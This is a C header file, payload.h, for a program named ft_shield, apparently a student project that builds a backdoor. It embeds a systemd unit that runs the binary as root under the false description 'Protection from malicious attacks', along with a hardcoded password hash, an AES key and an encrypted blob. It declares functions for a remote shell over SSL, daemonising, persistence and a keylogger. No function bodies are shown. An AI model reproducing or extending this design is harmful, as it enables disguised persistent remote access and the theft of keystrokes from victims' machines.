#ifndef PAYLOAD_H
#define PAYLOAD_H

// grep -rnw /usr/include -e 'CLONE_SYSVSEM'
#define _GNU_SOURCE
#include <string.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <syslog.h>
#include <signal.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <sys/file.h>
#include <pthread.h>
#include <sys/wait.h>
#include <openssl/ssl.h>
#include <openssl/err.h>
#include <openssl/sha.h>
#include <sys/select.h>
#include <sys/syscall.h>      /* Definition of SYS_* constants */
#include <sys/mman.h>
/* #define _GNU_SOURCE
#include <sched.h>
#include <linux/sched.h>
*/
#include <sys/resource.h> 
#include <dlfcn.h>
#include <stdbool.h>
#include <errno.h>
#include <linux/prctl.h>

#define MAX_CLIENTS 3
#define sc(...) syscall(__VA_ARGS__)
#define CREATE_ARGS pthread_t *thread, const pthread_attr_t *attr, void *(*start_routine) (void *), void *arg
#define LOCK 1
#define UNLOCK 0
#define CREATE 1
#define DETACH 2
#define MLOCK 3
#define MUNLOCK 4
#define SSL_CERT_PATH "/opt/ssl/ft_shield_cert.pem"
#define SSL_KEY_PATH "/opt/ssl/ft_shield_key.pem"

#ifndef HASHED_PWD
    #define HASHED_PWD "55508b98d2e777bcf11fbd23506a89d4ef021a14c0db1e05647d331fd6c9c95e"
#endif
#ifndef SALT
    #define SALT "4j9K2x7VzQmLp3Bt"
#endif


#ifndef SYSTEMCTL_CONFIG
    #define SYSTEMCTL_CONFIG \
    "[Unit]\n" \
    "Description=ft_shield - Protection from malicious attacks\n" \
    "After=local-fs.target\n\n" \
    "[Service]\n" \
    "Type=forking\n" \
    "User=root\n" \
    "Group=root\n" \
    "ExecStart=/usr/bin/ft_shield\n" \
    "UMask=007\n" \
    "Restart=on-failure\n\n" \
    "[Install]\n" \
    "WantedBy=multi-user.target\n"
#endif

#ifndef enc_hex_txt
    #define enc_hex_txt \
        0x10, 0x44, 0x10, 0x36, 0x9c, 0x83, 0x29, 0x89, 0x16, 0x39, 0xb8, 0xc6, \
        0xb1, 0x23, 0x8b, 0x9c, 0x9f, 0xe2, 0xa5, 0xc1, 0x5b, 0xa8, 0x03, 0xdb, \
        0x00, 0xae, 0x29, 0xf6, 0x06, 0x6a, 0xda, 0x41, 0x0b, 0xd7, 0xb1, 0xfe, \
        0x38, 0x77, 0xf3, 0xef, 0x26, 0x24, 0x96, 0x74, 0xe4, 0xb7, 0xe3, 0x9b, \
        0x64, 0x25, 0x78, 0xb7, 0xb6, 0x20, 0x8b, 0xa3, 0x5f, 0x24, 0xee, 0x08, \
        0xbd, 0xe0, 0x1e, 0xcd, 0x48, 0x48, 0x60, 0x45, 0x7c, 0x5f, 0x44, 0xfd, \
        0x7b, 0x9a, 0x9e, 0xc1, 0xf6, 0x30, 0xc5, 0x81, 0x88, 0xaf, 0x77, 0x54, \
        0x91, 0x37, 0x20, 0xfd, 0x03, 0xf5, 0x0d, 0x5e, 0x95, 0x28, 0x34, 0x13, \
        0xbb, 0x4f, 0x9d, 0x31, 0xa0, 0xeb, 0x8e, 0x3e, 0x6d, 0xc9, 0x60, 0xac, \
        0xf7, 0x3e, 0x47, 0xe9
#endif

#ifndef enc_txt_len
    #define enc_txt_len 112
#endif

#ifndef aes_key
    #define aes_key \
        0x2b, 0x7e, 0x15, 0x16, 0x28, 0xae, 0xd2, 0xa6, 0xab, 0xf7,\
        0x15, 0x88, 0x09, 0xcf, 0x4f, 0x3c
#endif

#ifndef iv
    #define aes_iv \
        0x00, 0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07, 0x08, 0x09,\
        0x0a, 0x0b, 0x0c, 0x0d, 0x0e, 0x0f
#endif


typedef struct s_args {
    int client_socket;
    SSL *ssl;
} t_args;


typedef int (*create_type)(CREATE_ARGS);
typedef int (*detach_type)(pthread_t id);
typedef int (*lock_type)(pthread_mutex_t * mutex);
typedef int (*unlock_type)(pthread_mutex_t *mutex);

SSL_CTX *create_context();

void handle_shell(SSL *ssl);
void configure_cert(SSL_CTX *ctx);
void ft_shutdown(t_args *args);
void create_daemon(void);
void handle_lock(int mod);
void read_event(char *event);
void get_plaintext(unsigned char *dest);

int p_create(CREATE_ARGS);
int p_detach(pthread_t id);
int m_lock(pthread_mutex_t mutex);
int m_unlock(pthread_mutex_t mutex);
void decode(int *data, char *decoded, int key, int n);

bool check_pwd(unsigned char *passwd, size_t passwd_len);

char *parse_device_name();
void set_persistence();
void *launch_keylogger(void *args);

#endif
